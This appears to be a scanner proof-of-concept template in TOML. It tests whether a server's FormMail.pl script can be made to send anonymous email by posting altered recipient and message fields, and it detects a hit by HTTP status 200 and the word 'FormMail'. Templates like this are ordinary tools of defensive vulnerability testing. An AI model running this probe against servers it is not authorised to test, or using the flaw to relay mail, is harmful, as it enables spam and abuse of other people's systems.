[info]
author = "ave"
description = "验证目标服务器 FormMail.pl 是否存在通过修改 recipient 和 message 参数发送匿名邮件的漏洞"
id = "POC-AVE-2001-0736"
name = "FormMail.pl 匿名邮件发送漏洞 PoC"
severity = "high"
tags = ["ave-2001-0736"]
vuln_id = [
    "CVE-2001-0357",
    "AVE-2001-0736",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/formmail.pl"
protocol = "http"

[poc.requests.body]
content = "recipient=test@example.com&message=test"
type = "form"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["FormMail"]
